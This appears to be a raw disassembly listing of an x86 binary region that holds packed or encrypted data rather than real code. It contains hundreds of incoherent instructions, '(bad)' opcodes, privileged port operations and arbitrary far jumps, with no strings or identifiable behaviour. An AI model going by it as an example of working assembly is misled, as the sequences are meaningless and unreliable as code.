  40f180:	sar    edx,1
  40f182:	ss iret 
  40f184:	stos   DWORD PTR es:[edi],eax
  40f185:	jcxz   0x40f168
  40f188:	loop   0x40f1f4
  40f18a:	push   eax
  40f18b:	cmp    edi,DWORD PTR [esi]
  40f18d:	in     al,dx
  40f18e:	(bad)  
  40f190:	sbb    DWORD PTR [eax+0x18e3f7d7],edx
  40f196:	std    
  40f197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f198:	adc    eax,0x509e1c8c
  40f19d:	out    dx,al
  40f19e:	je     0x40f179
  40f1a0:	xchg   ebx,eax
  40f1a1:	test   al,0xa2
  40f1a3:	shl    DWORD PTR [ecx+0x6f],1
  40f1a6:	test   eax,0xddcf1e39
  40f1ab:	dec    edi
  40f1ac:	mov    ebp,0x82c5de1
  40f1b1:	fisubr WORD PTR [ebp+0x6cec2d38]
  40f1b7:	gs cld 
  40f1b9:	sub    eax,0x25086ed
  40f1be:	xor    eax,0xf86cdc0b
  40f1c3:	jl     0x40f183
  40f1c5:	xchg   ebx,eax
  40f1c6:	imul   edx,DWORD PTR [edx+0x18],0xd94b0fdf
  40f1cd:	and    BYTE PTR [ecx-0x6e],dl
  40f1d0:	ret    0xb26c
  40f1d3:	sti    
  40f1d4:	sbb    al,0x54
  40f1d6:	in     al,0xad
  40f1d8:	fwait
  40f1d9:	in     al,dx
  40f1da:	cld    
  40f1db:	jle    0x40f1bb
  40f1dd:	pop    es
  40f1de:	sbb    DWORD PTR [ebx],edx
  40f1e0:	mov    BYTE PTR [esi+esi*8],bl
  40f1e3:	fwait
  40f1e4:	cdq    
  40f1e5:	daa    
  40f1e6:	sbb    BYTE PTR [ebx-0x75],bl
  40f1e9:	add    ebp,edx
  40f1eb:	jbe    0x40f222
  40f1ed:	or     esi,DWORD PTR ds:0x9f9ec0f8
  40f1f3:	pusha  
  40f1f4:	sub    edi,ecx
  40f1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f7:	loop   0x40f20e
  40f1f9:	jmp    FWORD PTR [ebp+0x56ac31ba]
  40f1ff:	fwait
  40f200:	dec    eax
  40f201:	pop    eax
  40f202:	push   ebx
  40f203:	push   es
  40f204:	mov    bh,0xd5
  40f206:	inc    ebx
  40f207:	je     0x40f1a5
  40f209:	neg    DWORD PTR [ebx-0x54140186]
  40f20f:	fistp  WORD PTR [edx]
  40f211:	add    eax,0xefb9095c
  40f216:	add    dl,BYTE PTR [esi]
  40f218:	data16 jg 0x40f1da
  40f21b:	sbb    ebx,edi
  40f21d:	xor    eax,0x16912610
  40f222:	mov    ds:0xc192ffcb,al
  40f227:	std    
  40f228:	jge    0x40f1b6
  40f22a:	xchg   esp,eax
  40f22b:	xchg   ecx,eax
  40f22c:	push   eax
  40f22d:	mov    ebx,0x89b145db
  40f232:	push   edx
  40f233:	popf   
  40f234:	xor    dh,BYTE PTR ds:0x2f8139fd
  40f23a:	repz sti 
  40f23c:	rcl    BYTE PTR [edi+0x41b090ce],1
  40f242:	fcom   QWORD PTR [edi]
  40f244:	xor    eax,0x1a54989a
  40f249:	mov    al,0x22
  40f24b:	sbb    DWORD PTR [ebp+esi*1-0x584a6baf],esp
  40f252:	sub    cl,BYTE PTR [edi-0x11]
  40f255:	dec    ecx
  40f256:	pop    ecx
  40f257:	xchg   esi,eax
  40f258:	mov    ah,0x72
  40f25a:	pushf  
  40f25b:	pop    ss
  40f25c:	clc    
  40f25d:	and    al,0xb
  40f25f:	lods   eax,DWORD PTR ds:[esi]
  40f260:	mov    bl,0xdb
  40f262:	xchg   ebp,eax
  40f263:	jbe    0x40f268
  40f265:	sar    dl,1
  40f267:	mov    WORD PTR [edx-0x19f2d9b6],?
  40f26d:	inc    edi
  40f26e:	repnz lds esp,FWORD PTR [edx+ebp*1+0xf]
  40f273:	pop    edi
  40f274:	jbe    0x40f271
  40f276:	dec    edx
  40f277:	mov    BYTE PTR [edx],al
  40f279:	pop    eax
  40f27a:	pop    ebp
  40f27b:	frstor [edi-0x279109ff]
  40f281:	pop    ebx
  40f282:	cmp    DWORD PTR [edx+0x60],ebx
  40f285:	mov    ah,0x3
  40f287:	fstp   QWORD PTR [ecx+eiz*1-0x2a]
  40f28b:	push   edx
  40f28c:	mov    ecx,0x5efc0bc0
  40f291:	mov    ecx,0x5d215be5
  40f296:	aaa    
  40f297:	das    
  40f298:	gs mov ebx,0x1288f99d
  40f29e:	xor    bl,BYTE PTR [edx+0x30]
  40f2a1:	rcl    BYTE PTR [ecx+edx*2],1
  40f2a4:	lds    esi,FWORD PTR [ebp-0x57533209]
  40f2aa:	mov    ebp,0xbfd331b1
  40f2af:	jge    0x40f2f2
  40f2b1:	cmp    BYTE PTR [edi+ebp*4+0x41],bh
  40f2b5:	push   0x829b01e0
  40f2ba:	imul   eax,DWORD PTR [edi],0xffffffb0
  40f2bd:	std    
  40f2be:	mov    BYTE PTR [esi+0x421d4d6],al
  40f2c4:	loope  0x40f272
  40f2c6:	pop    ebx
  40f2c7:	pop    ds
  40f2c8:	(bad)  
  40f2cb:	icebp  
  40f2cc:	shl    eax,cl
  40f2ce:	jle    0x40f280
  40f2d0:	xor    dl,BYTE PTR [ecx+0x65bb83da]
  40f2d6:	cld    
  40f2d7:	dec    ecx
  40f2d8:	out    dx,al
  40f2d9:	mul    BYTE PTR [edi+0x76]
  40f2dc:	js     0x40f338
  40f2de:	nop
  40f2df:	imul   eax,DWORD PTR [eax],0x5b
  40f2e2:	mov    al,0x7e
  40f2e4:	xchg   esp,eax
  40f2e5:	mov    cl,0xfa
  40f2e7:	and    ebx,edx
  40f2e9:	popf   
  40f2ea:	fwait
  40f2eb:	mov    WORD PTR [edx],es
  40f2ed:	adc    al,0x85
  40f2ef:	cmp    BYTE PTR [eax-0x31dff288],al
  40f2f5:	leave  
  40f2f6:	or     DWORD PTR [ebp-0x3a],esp
  40f2f9:	dec    esi
  40f2fa:	fst    DWORD PTR [eax]
  40f2fc:	adc    BYTE PTR [ebp+0x65],ah
  40f2ff:	xor    DWORD PTR [ebp+0x14ef53b6],esp
  40f305:	mov    DWORD PTR [ecx],edx
  40f307:	mov    ds:0x9c0b6ef3,al
  40f30c:	aas    
  40f30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f30e:	stos   BYTE PTR es:[edi],al
  40f30f:	(bad)  
  40f310:	mov    ebp,0xc973b4bc
  40f315:	mov    DWORD PTR [edi-0x1f145d85],ebx
  40f31b:	mov    esi,0x92a7866e
  40f320:	push   edi
  40f321:	inc    ecx
  40f322:	fnstenv [edi+0x77]
  40f325:	sub    al,BYTE PTR [ecx]
  40f327:	(bad)  
  40f328:	sub    BYTE PTR [bx+si+0x20],bl
  40f32c:	loop   0x40f347
  40f32e:	sbb    al,0x99
  40f330:	mov    ebp,0xe1490922
  40f335:	ret    
  40f336:	xor    bh,BYTE PTR [ebp+0x5af467c0]
  40f33c:	out    dx,eax
  40f33d:	mov    ebp,0x7533125
  40f342:	add    al,0x2d
  40f344:	and    dh,BYTE PTR [ebx]
  40f346:	jge    0x40f3bf
  40f348:	rcl    BYTE PTR [edi],cl
  40f34a:	ds jns 0x40f2e9
  40f34d:	sbb    ch,BYTE PTR [esi+edi*2+0x6243d7a5]
  40f354:	sahf   
  40f355:	adc    al,BYTE PTR [ecx-0x68]
  40f358:	scas   al,BYTE PTR es:[edi]
  40f359:	adc    al,0xb2
  40f35b:	mov    ebx,0x5d53e1a7
  40f360:	push   es
  40f361:	ins    DWORD PTR es:[edi],dx
  40f362:	push   esi
  40f363:	pop    ebp
  40f364:	test   DWORD PTR [ebx-0x6fbc6e35],eax
  40f36a:	cdq    
  40f36b:	loope  0x40f3b9
  40f36d:	jl     0x40f338
  40f36f:	fist   WORD PTR [edx+0x66e9d11a]
  40f375:	repnz xor bh,BYTE PTR [ecx-0x40]
  40f379:	sub    ebx,edi
  40f37b:	jg     0x40f372
  40f37d:	mov    dh,0x57
  40f37f:	fs mov esp,cs
  40f382:	or     al,0x6f
  40f384:	icebp  
  40f385:	imul   eax,DWORD PTR [edx+0x3dcf0966],0x784de664
  40f38f:	inc    edi
  40f390:	jle    0x40f334
  40f392:	clc    
  40f393:	scas   al,BYTE PTR es:[edi]
  40f394:	adc    eax,0x9409053f
  40f399:	popa   
  40f39a:	pop    ebx
  40f39b:	xchg   ecx,eax
  40f39c:	mov    bl,0x55
  40f39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f39f:	mov    dh,0x64
  40f3a1:	iret   
  40f3a2:	repnz out dx,al
  40f3a4:	inc    ecx
  40f3a5:	push   0x64
  40f3a7:	or     bh,BYTE PTR [esi+0x39a6552]
  40f3ad:	or     dl,ch
  40f3af:	ds retf 
  40f3b1:	aad    0x88
  40f3b3:	xchg   edx,eax
  40f3b4:	arpl   WORD PTR [edx+0x1242b2aa],si
  40f3ba:	dec    edi
  40f3bb:	add    al,0x9e
  40f3bd:	mov    ?,WORD PTR [esi+esi*1]
  40f3c0:	pop    ecx
  40f3c1:	mov    ebx,0xe59192de
  40f3c6:	xor    eax,0xfada1247
  40f3cb:	sbb    DWORD PTR [eax-0x1d],edi
  40f3ce:	(bad)  
  40f3cf:	sbb    edx,ebx
  40f3d1:	ins    DWORD PTR es:[edi],dx
  40f3d2:	jo     0x40f356
  40f3d4:	lock shl BYTE PTR [ecx],cl
  40f3d7:	sbb    ebp,DWORD PTR [ebx-0x693e4115]
  40f3dd:	lods   al,BYTE PTR ss:[esi]
  40f3df:	mov    al,ds:0x71db8ac7
  40f3e4:	dec    ecx
  40f3e5:	xor    DWORD PTR [edi],esp
  40f3e7:	sbb    dh,BYTE PTR [edx+0xd9d61f3]
  40f3ed:	xor    eax,0x9034a0
  40f3f2:	push   edi
  40f3f3:	pop    edx
  40f3f4:	setno  BYTE PTR [edx]
  40f3f7:	xchg   edx,eax
  40f3f8:	into   
  40f3f9:	ret    0x5c88
  40f3fc:	mov    dl,0xec
  40f3fe:	data16 fisttp QWORD PTR [edi+esi*4+0x579b7469]
  40f406:	add    al,0x2d
  40f408:	ja     0x40f483
  40f40a:	(bad)  
  40f40b:	jbe    0x40f438
  40f40d:	jae    0x40f398
  40f40f:	jl     0x40f451
  40f411:	xchg   ebp,eax
  40f412:	adc    esp,eax
  40f414:	mov    ebx,ebx
  40f416:	popf   
  40f417:	daa    
  40f418:	hlt    
  40f419:	dec    esp
  40f41a:	xchg   DWORD PTR ds:0x1ba2cfb2,ebx
  40f420:	(bad)
  40f424:	mov    ah,0x23
  40f426:	and    DWORD PTR [edx+0x46efe1c9],eax
  40f42c:	mov    cl,0x92
  40f42e:	push   edi
  40f42f:	xor    bl,cl
  40f431:	fistp  QWORD PTR [ebx+esi*8]
  40f434:	lea    eax,[ecx]
  40f436:	mov    WORD PTR [edx+0x6701689a],gs
  40f43c:	(bad)  
  40f43d:	sbb    eax,0xd096ea2e
  40f442:	xchg   ebp,eax
  40f443:	push   eax
  40f444:	outs   dx,DWORD PTR ss:[esi]
  40f446:	adc    al,0xac
  40f448:	inc    ebx
  40f449:	pop    ebx
  40f44a:	dec    ebp
  40f44b:	ror    BYTE PTR [edx],cl
  40f44d:	adc    al,0xe0
  40f44f:	xlat   BYTE PTR ds:[ebx]
  40f450:	std    
  40f451:	lds    eax,FWORD PTR [ecx]
  40f453:	outs   dx,DWORD PTR ds:[esi]
  40f454:	mov    al,ds:0xfef3d919
  40f459:	cmp    BYTE PTR [ecx-0x2e],ch
  40f45c:	popa   
  40f45d:	int3   
  40f45e:	les    edi,FWORD PTR [ecx-0x45]
  40f461:	inc    ebx
  40f462:	and    dl,0xc4
  40f465:	aas    
  40f466:	xchg   DWORD PTR [eax],edi
  40f468:	jle    0x40f469
  40f46a:	inc    ecx
  40f46b:	(bad)  [ebx]
  40f46d:	dec    esi
  40f46e:	mov    ds:0xb3bbad71,eax
  40f473:	mov    al,0xf6
  40f475:	cmp    al,BYTE PTR [edi]
  40f477:	or     eax,0x2c9959cb
  40f47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f47d:	pop    edx
  40f47e:	sahf   
  40f47f:	dec    ebx
  40f480:	or     ebp,DWORD PTR [esi+0x67]
  40f483:	in     al,0xf3
  40f485:	imul   ebp,ebp,0xd1614d47
  40f48b:	fwait
  40f48c:	jg     0x40f4c6
  40f48e:	xor    BYTE PTR [ecx],ah
  40f490:	push   edi
  40f491:	mov    edi,0x6b31d61a
  40f496:	cwde   
  40f497:	push   eax
  40f498:	push   0xabb6f82e
  40f49d:	mov    esi,0x4c6b931a
  40f4a2:	pop    ss
  40f4a3:	inc    DWORD PTR [edx+eiz*8+0xa]
  40f4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a8:	clc    
  40f4a9:	sbb    dh,BYTE PTR [esi+0x1f213630]
  40f4af:	call   0x2516cac0
  40f4b4:	adc    edx,esi
  40f4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b7:	push   edi
  40f4b8:	adc    DWORD PTR [ecx+0x770fc0c8],esp
  40f4be:	add    ebp,DWORD PTR [ebp+0x654be896]
  40f4c4:	xor    eax,0xa22bcf3c
  40f4c9:	ror    BYTE PTR [ebp-0x52],0xba
  40f4cd:	leave  
  40f4ce:	mov    ebp,0x36adc46d
  40f4d3:	adc    dl,BYTE PTR [ebx+0x6dc76bc5]
  40f4d9:	fldenv [ebx]
  40f4db:	push   ss
  40f4dc:	inc    ebx
  40f4dd:	mov    ds:0xba86ac4e,al
  40f4e2:	in     eax,0x24
  40f4e4:	mov    cl,0x21
  40f4e6:	std    
  40f4e7:	aam    0x87
  40f4e9:	mov    al,ds:0x78a3d5e7
  40f4ee:	bound  ebp,QWORD PTR [eax-0x73]
  40f4f1:	xor    al,0x1f
  40f4f3:	mov    al,ds:0x6a1af5a6
  40f4f8:	mov    ebx,0xfb8f65c9
  40f4fd:	mov    esi,0x6b51bbc4
  40f502:	xchg   esi,eax
  40f503:	imul   ebx,DWORD PTR [ecx+eiz*8-0x2a],0xddc1c6f7
  40f50b:	xchg   edi,eax
  40f50c:	dec    edx
  40f50d:	sahf   
  40f50e:	sbb    eax,0x744574ee
  40f513:	int3   
  40f514:	outs   dx,DWORD PTR es:[esi]
  40f516:	pop    ebx
  40f517:	xchg   ebx,eax
  40f518:	gs ret 
  40f51a:	cmp    ecx,DWORD PTR [edi-0x4660d9a6]
  40f520:	and    ecx,esp
  40f522:	or     eax,0xded187a3
  40f527:	not    DWORD PTR [edi]
  40f529:	cld    
  40f52a:	add    DWORD PTR ds:0x4d9beaa4,ebp
  40f530:	pop    esi
  40f531:	fistp  DWORD PTR [ebx-0xf3fb2fe]
  40f537:	adc    BYTE PTR [edx-0xb],ah
  40f53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f53b:	or     al,0xa
  40f53d:	push   ecx
  40f53e:	adc    ecx,DWORD PTR [ecx]
  40f540:	(bad)  [ebp-0x5b76b313]
  40f546:	sub    ah,BYTE PTR [esi]
  40f548:	push   cs
  40f549:	loopne 0x40f5be
  40f54b:	jp     0x40f575
  40f54d:	push   edx
  40f54e:	ins    BYTE PTR es:[edi],dx
  40f54f:	sahf   
  40f550:	scas   al,BYTE PTR es:[edi]
  40f551:	je     0x40f527
  40f553:	or     BYTE PTR [esi],bh
  40f555:	sahf   
  40f556:	push   edx
  40f557:	call   DWORD PTR [eax]
  40f559:	stc    
  40f55a:	jg     0x40f5bd
  40f55c:	and    eax,0x73633f96
  40f561:	mov    ebx,0xd2586329
  40f566:	mov    ebp,DWORD PTR [eax+0x6a487061]
  40f56c:	jno    0x40f530
  40f56e:	(bad)  
  40f56f:	jmp    0x40f5ca
  40f571:	popf   
  40f572:	mov    WORD PTR [ecx-0x42359b4],fs
  40f578:	mov    dh,0xe2
  40f57a:	add    DWORD PTR [esi],ebp
  40f57c:	sahf   
  40f57d:	mov    dl,0xb5
  40f57f:	push   ecx
  40f580:	xor    ch,BYTE PTR [eax-0x3c]
  40f583:	mov    DWORD PTR [edx-0x42],ebx
  40f586:	stc    
  40f587:	pop    esp
  40f588:	out    dx,al
  40f589:	scas   al,BYTE PTR es:[edi]
  40f58a:	jae    0x40f5ab
  40f58c:	inc    edx
  40f58d:	inc    ecx
  40f58e:	pusha  
  40f58f:	call   0x139ce29a
  40f594:	jns    0x40f5f2
  40f596:	ja     0x40f553
  40f598:	out    dx,eax
  40f599:	or     eax,0xc
  40f59c:	and    eax,0x8fd1b603
  40f5a1:	aas    
  40f5a2:	inc    esi
  40f5a3:	das    
  40f5a4:	mov    ch,0xee
  40f5a6:	mov    al,ds:0xb6d293e6
  40f5ab:	out    0x30,eax
  40f5ad:	inc    esp
  40f5ae:	xor    BYTE PTR [edx+0x72e332fa],0xc
  40f5b5:	push   edi
  40f5b6:	out    0xe2,al
  40f5b8:	mov    ecx,0x72907ec8
  40f5bd:	out    dx,al
  40f5be:	adc    bh,BYTE PTR [ebp-0x46e797d3]
  40f5c4:	jns    0x40f5fa
  40f5c6:	iret   
  40f5c7:	or     al,0x5a
  40f5c9:	jg     0x40f62c
  40f5cb:	add    eax,0x8698acd8
  40f5d0:	cmp    eax,DWORD PTR [ecx-0x41689b9c]
  40f5d6:	repz int3 
  40f5d8:	mov    DWORD PTR [edx-0x26],edx
  40f5db:	daa    
  40f5dc:	imul   BYTE PTR [ebp+0x54]
  40f5df:	jne    0x40f568
  40f5e1:	pusha  
  40f5e2:	cs aaa 
  40f5e4:	loop   0x40f5b5
  40f5e6:	push   eax
  40f5e7:	enter  0x4cd0,0x8d
  40f5eb:	adc    BYTE PTR [ebx-0xeb05089],ch
  40f5f1:	jecxz  0x40f5c1
  40f5f3:	xchg   esi,eax
  40f5f4:	dec    edi
  40f5f5:	retf   
  40f5f6:	push   edi
  40f5f7:	push   esp
  40f5f8:	jle    0x40f656
  40f5fa:	or     al,0x48
  40f5fc:	test   ah,dl
  40f5fe:	into   
  40f5ff:	inc    ecx
  40f600:	mov    al,0x3a
  40f602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f603:	inc    edi
  40f604:	inc    ebp
  40f605:	inc    ebp
  40f606:	shr    edi,0xb5
  40f609:	push   cs
  40f60a:	jmp    0x6ae4:0x2ac800a
  40f611:	lock mov al,0x9f
  40f614:	stos   BYTE PTR es:[edi],al
  40f615:	adc    eax,0x940a11ef
  40f61a:	call   0x4651:0xfe0e6f91
  40f621:	adc    al,0xef
  40f623:	test   DWORD PTR [ebp-0xc],edx
  40f626:	inc    esi
  40f627:	push   ss
  40f628:	pop    ebx
  40f629:	fldenv [edx-0x51e2fc8d]
  40f62f:	mov    ecx,0x5bcc8310
  40f634:	dec    edx
  40f635:	mov    dh,0xbb
  40f637:	ret    0x7a79
  40f63a:	mov    dl,0xed
  40f63c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f63d:	mov    cl,0x4a
  40f63f:	scas   al,BYTE PTR es:[edi]
  40f640:	rcr    BYTE PTR [edi+ecx*2],cl
  40f643:	lea    eax,[esi]
  40f645:	iret   
  40f646:	or     eax,0x5aa31401
  40f64b:	dec    ebx
  40f64c:	dec    edi
  40f64d:	and    DWORD PTR [eax+esi*4],0x3c3debbd
  40f654:	mov    ebp,0xa72a013
  40f659:	inc    eax
  40f65a:	cmp    ebx,DWORD PTR ds:0x8e1f0523
  40f660:	and    BYTE PTR [ebp-0x386c8f9f],al
  40f666:	xchg   ebx,eax
  40f667:	xor    DWORD PTR [eax-0x55],esi
  40f66a:	or     ebx,0xffffffcd
  40f66d:	and    BYTE PTR [ebx],ch
  40f66f:	mov    WORD PTR [esi+ecx*1-0x791d63c8],es
  40f676:	outs   dx,BYTE PTR ds:[esi]
  40f677:	sub    BYTE PTR [esi],ah
  40f679:	and    BYTE PTR [eax-0x65],ch
  40f67c:	jno    0x40f67f
  40f67e:	xchg   BYTE PTR [edx+0x19f9d390],cl
  40f684:	(bad)  
  40f685:	inc    eax
  40f686:	jne    0x40f60e
  40f688:	fwait
  40f689:	aas    
  40f68a:	push   DWORD PTR [edx+0x3b]
  40f68d:	push   ds
  40f68e:	xor    dh,BYTE PTR [ecx-0x3913777a]
  40f694:	push   esp
  40f695:	ins    BYTE PTR es:[edi],dx
  40f696:	and    DWORD PTR [edi],0x1b
  40f699:	leave  
  40f69a:	inc    esi
  40f69b:	jg     0x40f67d
  40f69d:	enter  0x7d73,0xaf
  40f6a1:	dec    eax
  40f6a2:	les    ebp,FWORD PTR [ebx+eiz*8]
  40f6a5:	ja     0x40f70f
  40f6a7:	push   esi
  40f6a8:	adc    eax,edx
  40f6aa:	cdq    
  40f6ab:	pop    es
  40f6ac:	jmp    0x3410:0xa04e8277
  40f6b3:	loopne 0x40f6aa
  40f6b5:	nop
  40f6b6:	cmc    
  40f6b7:	cdq    
  40f6b8:	int3   
  40f6b9:	pop    ecx
  40f6ba:	ds (bad) 
  40f6bc:	jmp    0x40f676
  40f6be:	adc    DWORD PTR [esi+0x64],esi
  40f6c1:	cmp    ecx,DWORD PTR [edx]
  40f6c3:	icebp  
  40f6c4:	push   ebx
  40f6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6c6:	sbb    edx,DWORD PTR [ebp+0x21]
  40f6c9:	inc    esp
  40f6ca:	add    esi,DWORD PTR [eax-0x1a24337b]
  40f6d0:	aam    0x44
  40f6d2:	dec    esp
  40f6d3:	int    0xaf
  40f6d5:	icebp  
  40f6d6:	sbb    al,0xdd
  40f6d8:	ret    0xd3f9
  40f6db:	adc    cl,BYTE PTR [edx]
  40f6dd:	or     ecx,0x9d0cd99f
  40f6e3:	sbb    al,0x98
  40f6e5:	ret    0xb441
  40f6e8:	xor    eax,DWORD PTR [edi+0x56]
  40f6eb:	sub    bl,al
  40f6ed:	std    
  40f6ee:	sbb    esp,DWORD PTR [edx]
  40f6f0:	gs in  eax,0xa2
  40f6f3:	ss pop edi
  40f6f5:	and    al,0x32
  40f6f7:	dec    edx
  40f6f8:	jl     0x40f6b7
  40f6fa:	outs   dx,DWORD PTR ds:[esi]
  40f6fb:	jl     0x40f704
  40f6fd:	test   eax,0x1c67ef15
  40f702:	and    cl,BYTE PTR [ecx+eiz*1-0x28]
  40f706:	sahf   
  40f707:	or     eax,esp
  40f709:	retf   0x750f
  40f70c:	and    al,0xbf
  40f70e:	aam    0x62
  40f710:	stos   BYTE PTR es:[edi],al
  40f711:	ss cmp al,0xc2
  40f714:	lock shr dl,cl
  40f717:	mov    eax,ds:0xa89cbb08
  40f71c:	lods   eax,DWORD PTR ds:[esi]
  40f71d:	jnp    0x40f768
  40f71f:	jecxz  0x40f749
  40f721:	dec    ebx
  40f722:	add    esi,esp
  40f724:	push   esi
  40f725:	mov    ds:0xdb552475,eax
  40f72a:	icebp  
  40f72b:	adc    al,0xe
  40f72d:	jne    0x40f6db
  40f72f:	push   eax
  40f730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f731:	xchg   BYTE PTR [ebp+0x58],dh
  40f734:	jne    0x40f7a2
  40f736:	ja     0x40f72e
  40f738:	je     0x40f731
  40f73a:	int3   
  40f73b:	xlat   BYTE PTR ds:[ebx]
  40f73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f73d:	sahf   
  40f73e:	fnstcw WORD PTR [edi+0x14]
  40f741:	xchg   ecx,eax
  40f742:	fist   DWORD PTR [ecx+0x24b27b74]
  40f748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f749:	fimul  DWORD PTR [edx+0x48]
  40f74c:	inc    esi
  40f74d:	fsubr  DWORD PTR [edi]
  40f74f:	cmp    edx,DWORD PTR [ebx]
  40f751:	stos   BYTE PTR es:[edi],al
  40f752:	fistp  WORD PTR [eax+0x5]
  40f755:	dec    ebx
  40f756:	retf   
  40f757:	adc    dl,BYTE PTR [esi+0x55]
  40f75a:	xchg   esi,eax
  40f75b:	fadd   st(0),st
  40f75d:	outs   dx,BYTE PTR ds:[esi]
  40f75e:	(bad)  
  40f75f:	ins    BYTE PTR es:[edi],dx
  40f760:	popf   
  40f761:	dec    ecx
  40f762:	mov    ss,esp
  40f764:	aad    0x17
  40f766:	adc    cl,ch
  40f768:	and    ah,bl
  40f76a:	pop    edi
  40f76b:	pushw  0xd
  40f76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f76f:	or     eax,0xfc21b504
  40f774:	frstor [ebx-0x3c184e70]
  40f77a:	and    DWORD PTR [edi],ecx
  40f77c:	push   ss
  40f77d:	xor    DWORD PTR [ecx],eax
  40f77f:	outs   dx,BYTE PTR ds:[esi]
  40f780:	shl    edi,cl
  40f782:	(bad)  
  40f783:	shl    DWORD PTR [edx+0x66e0d35e],cl
  40f789:	adc    dl,bh
  40f78b:	popf   
  40f78c:	adc    eax,0x89200912
  40f791:	popa   
  40f792:	sub    al,0x14
  40f794:	push   edi
  40f795:	inc    edi
  40f796:	(bad)  
  40f797:	mov    ah,0x96
  40f799:	mov    ah,0xd4
  40f79b:	dec    edx
  40f79c:	leave  
  40f79d:	sbb    BYTE PTR [esi+edx*4-0x2a],0x8f
  40f7a2:	in     al,0xd9
  40f7a4:	imul   BYTE PTR [ebp-0x43f8ade0]
  40f7aa:	push   cs
  40f7ab:	leave  
  40f7ac:	mov    edi,0x1a809ed
  40f7b1:	ins    BYTE PTR es:[edi],dx
  40f7b2:	jo     0x40f762
  40f7b4:	aas    
  40f7b5:	cs nop
  40f7b7:	pop    ebp
  40f7b8:	test   eax,0x9516a62c
  40f7bd:	adc    al,0x9e
  40f7bf:	(bad)  
  40f7c0:	lock dec ebp
  40f7c2:	mov    al,ds:0x7aacb3ab
  40f7c7:	xor    al,0x93
  40f7c9:	pop    ecx
  40f7ca:	outs   dx,DWORD PTR ds:[esi]
  40f7cb:	jecxz  0x40f759
  40f7cd:	imul   eax,DWORD PTR [esi],0xffffff8a
  40f7d0:	sar    BYTE PTR [esi-0x7ba5fafb],1
  40f7d6:	fidivr WORD PTR [edx]
  40f7d8:	ins    DWORD PTR es:[edi],dx
  40f7d9:	xor    ah,BYTE PTR ds:0x18af9f8
  40f7df:	push   0x570bee77
  40f7e4:	xchg   ebp,eax
  40f7e5:	jnp    0x40f7f9
  40f7e7:	iret   
  40f7e8:	bound  ebx,QWORD PTR [edx-0x371dfe27]
  40f7ee:	jge    0x40f791
  40f7f0:	iret   
  40f7f1:	(bad)  
  40f7f2:	pusha  
  40f7f3:	iret   
  40f7f4:	leave  
  40f7f5:	mov    dh,0x7a
  40f7f7:	xchg   esp,eax
  40f7f8:	call   0x8af7a176
  40f7fd:	pop    esi
  40f7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7ff:	ds add ah,dh
  40f802:	xor    DWORD PTR [ebp+0x3a14df41],esi
  40f808:	xchg   ebx,eax
  40f809:	test   BYTE PTR [ecx+0x14],cl
  40f80c:	sbb    al,0x8e
  40f80e:	xchg   edx,eax
  40f80f:	xor    BYTE PTR [eax+eax*8],bl
  40f812:	outs   dx,BYTE PTR ds:[esi]
  40f813:	popf   
  40f814:	in     eax,dx
  40f815:	pop    ds
  40f816:	bound  eax,QWORD PTR [edi+0x634deb1b]
  40f81c:	sub    DWORD PTR [edx],ebp
  40f81e:	dec    esp
  40f81f:	inc    esp
  40f820:	push   ecx
  40f821:	call   0xa8b9:0xb66a9aff
  40f828:	aad    0xad
  40f82a:	or     esi,DWORD PTR [edx+0x6d]
  40f82d:	pop    esp
  40f82e:	in     al,dx
  40f82f:	adc    DWORD PTR [eax],ebx
  40f831:	das    
  40f832:	(bad)
  40f835:	dec    eax
  40f836:	js     0x40f852
  40f838:	shl    BYTE PTR [edi],0xe9
  40f83b:	add    al,0x13
  40f83d:	outs   dx,DWORD PTR ds:[esi]
  40f83e:	rcl    ebp,cl
  40f840:	(bad)  
  40f841:	data16 in al,0x93
  40f844:	mov    ah,0x40
  40f846:	ins    DWORD PTR es:[edi],dx
  40f847:	mov    esp,0x3721a97e
  40f84c:	xor    DWORD PTR [ecx-0x2f3916f0],esi
  40f852:	dec    edi
  40f853:	push   edi
  40f854:	fbld   TBYTE PTR [esi-0x23a4aa2]
  40f85a:	in     eax,dx
  40f85b:	movzx  edx,WORD PTR [esi+ebx*1+0x4a]
  40f860:	repz dec esp
  40f862:	mov    esi,0x1b4b8e29
  40f867:	retf   0x4bd0
  40f86a:	push   eax
  40f86c:	(bad)  [eax-0x28ee91c]
  40f872:	loop   0x40f820
  40f874:	sbb    DWORD PTR [eax],eax
  40f876:	push   eax
  40f877:	mov    al,ds:0xe4ee0074
  40f87c:	jmp    0x1f73:0x1001cb9a
  40f883:	adc    edi,ebp
  40f885:	repnz rol DWORD PTR [ebx-0x6beaa94],0xef
  40f88d:	adc    al,0x59
  40f88f:	push   edi
  40f890:	enter  0x2e53,0x49
  40f894:	lods   al,BYTE PTR ds:[esi]
  40f895:	xor    eax,0xf2ff36a6
  40f89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f89b:	(bad)  
  40f89c:	stc    
  40f89d:	retf   0x2931
  40f8a0:	retf   0x8622
  40f8a3:	out    dx,al
  40f8a4:	add    al,0xcc
  40f8a6:	xchg   ebp,eax
  40f8a7:	mov    ebp,ebp
  40f8a9:	push   ecx
  40f8aa:	sbb    eax,0x3ac86845
  40f8af:	std    
  40f8b0:	xor    al,0xd2
  40f8b2:	bound  esi,QWORD PTR [ebx+0x5b8ec7d7]
  40f8b8:	xor    edi,esp
  40f8ba:	leave  
  40f8bb:	xchg   edi,eax
  40f8bc:	ins    DWORD PTR es:[edi],dx
  40f8bd:	pop    ebp
  40f8be:	sbb    dh,ch
